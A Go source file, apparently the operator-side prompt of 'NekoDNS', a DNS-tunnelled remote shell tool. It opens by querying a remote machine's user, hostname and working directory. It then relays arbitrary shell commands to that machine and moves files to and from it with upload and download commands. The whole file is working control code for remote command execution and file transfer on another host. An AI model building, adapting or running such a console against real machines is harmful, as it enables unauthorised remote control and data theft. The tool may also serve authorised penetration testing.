package nekodns

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
)

// Prompt manages the interactive shell
type Prompt struct {
	Handler    *Handler
	RemoteInfo *RemoteInfo
	Silent     bool
	WhoamiRaw  string
}

// NewPrompt creates a new prompt
func NewPrompt(handler *Handler, silent bool) *Prompt {
	return &Prompt{
		Handler:    handler,
		RemoteInfo: &RemoteInfo{Pwd: "~"},
		Silent:     silent,
	}
}

// Loop starts the interactive prompt loop
func (p *Prompt) Loop() {
	time.Sleep(1 * time.Second)

	// Get initial info
	p.getInitialInfo()

	reader := bufio.NewReader(os.Stdin)
	root := false

	for {
		fmt.Print(p.getCustomPrompt(root))
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == "" {
			fmt.Println()
			continue
		}

		// Handle special commands
		switch {
		case command == "exit":
			if root {
				fmt.Println()
				p.RemoteInfo.Lock()
				p.RemoteInfo.Whoami = p.WhoamiRaw
				p.RemoteInfo.Unlock()
				root = false
				continue
			}
			command = "exit2"

		case command == "kill":
			command = "exit"

		case command == "clear" || command == "cls":
			fmt.Print("\033[H\033[2J")
			continue

		case command == "help":
			p.printHelp()
			continue

		case strings.HasPrefix(command, "cd "):
			p.handleCDCommand(command)
			continue

		case strings.HasPrefix(command, "upload "):
			p.handleUploadCommand(command)
			continue

		case strings.HasPrefix(command, "download "):
			p.handleDownloadCommand(command)
			continue
		}

		if command == "exit2" {
			color.Red("[!] Exiting..\n")
			os.Exit(0)
		}

		// Execute command
		if command != "" {
			p.Handler.ActiveCmd.Lock()
			p.Handler.ActiveCmd.Cmd = command
			p.Handler.ActiveCmd.Delivered = false
			p.Handler.ActiveCmd.Unlock()

			if command == "exit" {
				color.Red("[!] Exiting..\n")
				select {
				case <-p.Handler.ResponseQueue:
				case <-time.After(30 * time.Second):
				}
				os.Exit(0)
			}

			select {
			case response := <-p.Handler.ResponseQueue:
				if response != "" {
					fmt.Println(strings.TrimSpace(response))
				}
				fmt.Println()
			case <-time.After(360 * time.Second):
				fmt.Println()
			}
		}
	}
}

// getInitialInfo gets initial system information
func (p *Prompt) getInitialInfo() {
	// Get whoami
	p.Handler.ActiveCmd.Lock()
	p.Handler.ActiveCmd.Cmd = "whoami"
	p.Handler.ActiveCmd.Delivered = false
	p.Handler.ActiveCmd.Unlock()

	select {
	case whoamiResult := <-p.Handler.ResponseQueue:
		p.WhoamiRaw = strings.TrimSpace(whoamiResult)
		p.RemoteInfo.Lock()
		p.RemoteInfo.Whoami = CleanWhoami(p.WhoamiRaw)
		p.RemoteInfo.Unlock()
	case <-time.After(10 * time.Second):
	}

	// Determine pwd command based on OS
	pwdCmd := "pwd"
	if strings.Contains(p.WhoamiRaw, "\\") {
		pwdCmd = "(pwd).Path"
	}

	// Get hostname
	p.Handler.ActiveCmd.Lock()
	p.Handler.ActiveCmd.Cmd = "hostname"
	p.Handler.ActiveCmd.Delivered = false
	p.Handler.ActiveCmd.Unlock()

	select {
	case hostnameResult := <-p.Handler.ResponseQueue:
		p.RemoteInfo.Lock()
		p.RemoteInfo.Hostname = strings.ToLower(strings.TrimSpace(hostnameResult))
		p.RemoteInfo.Unlock()
	case <-time.After(10 * time.Second):
	}

	// Get pwd
	p.Handler.ActiveCmd.Lock()
	p.Handler.ActiveCmd.Cmd = pwdCmd
	p.Handler.ActiveCmd.Delivered = false
	p.Handler.ActiveCmd.Unlock()

	select {
	case pwdResult := <-p.Handler.ResponseQueue:
		p.RemoteInfo.Lock()
		p.RemoteInfo.Pwd = strings.TrimSpace(pwdResult)
		p.RemoteInfo.Unlock()
	case <-time.After(10 * time.Second):
	}
}

// getCustomPrompt returns the formatted prompt
func (p *Prompt) getCustomPrompt(root bool) string {
	p.RemoteInfo.RLock()
	whoami := p.RemoteInfo.Whoami
	hostname := p.RemoteInfo.Hostname
	path := p.RemoteInfo.Pwd
	p.RemoteInfo.RUnlock()

	if whoami == "" {
		whoami = "user"
	}
	if hostname == "" {
		hostname = "host"
	}

	slash := "/"
	if strings.Contains(path, "\\") {
		slash = "\\"
	}

	path = strings.TrimSpace(path)
	shortpath := path
	if len(path) > 24 {
		parts := strings.Split(path, slash)
		if len(parts) > 3 {
			shortpath = ".." + slash + strings.Join(parts[len(parts)-3:], slash)
		}
	}

	if root {
		whoami = "root"
	}

	// Simple colored prompt
	return fmt.Sprintf("\033[42;90m [NekoDNS] \033[0m\033[44;90m %s@%s \033[0m\033[43;90m %s \033[0m ", whoami, hostname, shortpath)
}

// handleCDCommand handles cd commands
func (p *Prompt) handleCDCommand(command string) {
	p.RemoteInfo.Lock()
	defer p.RemoteInfo.Unlock()

	parts := strings.SplitN(command, " ", 2)
	if len(parts) < 2 {
		return
	}

	newPath := strings.TrimSpace(parts[1])
	currentPath := p.RemoteInfo.Pwd

	slash := "/"
	if strings.Contains(currentPath, "\\") {
		slash = "\\"
	}

	// Handle relative paths
	if newPath == ".." {
		pathParts := strings.Split(strings.Trim(currentPath, slash), slash)
		if len(pathParts) > 1 {
			p.RemoteInfo.Pwd = slash + strings.Join(pathParts[:len(pathParts)-1], slash)
		} else {
			p.RemoteInfo.Pwd = slash
		}
	} else if !strings.HasPrefix(newPath, slash) && !(slash == "\\" && strings.Contains(newPath, ":")) {
		if !strings.HasSuffix(currentPath, slash) {
			currentPath += slash
		}
		p.RemoteInfo.Pwd = currentPath + strings.TrimSuffix(newPath, slash)
	} else {
		p.RemoteInfo.Pwd = strings.TrimSuffix(newPath, slash)
	}

	p.Handler.ActiveCmd.Lock()
	p.Handler.ActiveCmd.Cmd = command
	p.Handler.ActiveCmd.Delivered = false
	p.Handler.ActiveCmd.Unlock()

	select {
	case <-p.Handler.ResponseQueue:
	case <-time.After(1 * time.Second):
	}
}

// handleUploadCommand handles file upload
func (p *Prompt) handleUploadCommand(command string) {
	parts := strings.Fields(command)
	if len(parts) != 3 {
		color.Red("[!] Usage: upload \"local_file\" \"remote_file\"\n")
		return
	}

	localPath := strings.Trim(parts[1], "\"")
	remotePath := strings.Trim(parts[2], "\"")

	fileBytes, err := os.ReadFile(localPath)
	if err != nil {
		color.Red("[!] File \"%s\" not found!\n", localPath)
		return
	}

	hexdata := hex.EncodeToString(fileBytes)
	chunkSize := (16 - 4) * 2
	var chunks []string

	for i := 0; i < len(hexdata); i += chunkSize {
		end := i + chunkSize
		if end > len(hexdata) {
			end = len(hexdata)
		}
		chunks = append(chunks, hexdata[i:end])
	}

	commandToClient := fmt.Sprintf("upload %s!%s", localPath, remotePath)

	p.Handler.ActiveCmd.Lock()
	p.Handler.ActiveCmd.Cmd = commandToClient
	p.Handler.ActiveCmd.Delivered = false
	p.Handler.ActiveCmd.Unlock()

	color.Magenta("[>] Uploading \"%s\" to \"%s\"..\n", localPath, remotePath)

	select {
	case <-p.Handler.ResponseQueue:
		p.Handler.ActiveCmd.Lock()
		p.Handler.ActiveCmd.Cmd = ""
		p.Handler.ActiveCmd.FileChunksToSend = chunks
		p.Handler.ActiveCmd.UploadInProgress = true
		p.Handler.ActiveCmd.Unlock()

		select {
		case <-p.Handler.ResponseQueue:
			p.Handler.ActiveCmd.Lock()
			p.Handler.ActiveCmd.Cmd = ""
			p.Handler.ActiveCmd.Delivered = false
			p.Handler.ActiveCmd.FileChunksToSend = nil
			p.Handler.ActiveCmd.UploadInProgress = false
			p.Handler.ActiveCmd.Unlock()
		case <-time.After(360 * time.Second):
		}

		color.Green("[+] File uploaded successfully to \"%s\"\n", remotePath)
	case <-time.After(360 * time.Second):
		color.Red("[!] Upload timeout\n")
	}
}

// handleDownloadCommand handles file download
func (p *Prompt) handleDownloadCommand(command string) {
	parts := strings.Fields(command)
	if len(parts) != 3 {
		color.Red("[!] Usage: download \"remote_file\" \"local_file\"\n")
		return
	}

	remotePath := strings.Trim(parts[1], "\"")
	localPath := strings.Trim(parts[2], "\"")

	commandToClient := fmt.Sprintf("download %s!%s", remotePath, localPath)

	p.Handler.ActiveCmd.Lock()
	p.Handler.ActiveCmd.Cmd = commandToClient
	p.Handler.ActiveCmd.Delivered = false
	p.Handler.ActiveCmd.Unlock()

	color.Magenta("[>] Downloading \"%s\" to \"%s\"..\n", remotePath, localPath)
}

// printHelp prints help information
func (p *Prompt) printHelp() {
	color.Green("[+] Available commands:\n")
	color.Blue("    upload: Upload a file from local to remote computer\n")
	color.Blue("    download: Download a file from remote to local computer\n")
	color.Blue("    clear/cls: Clear terminal screen\n")
	color.Blue("    kill: Kill client connection\n")
	color.Blue("    exit: Exit from program\n")
}
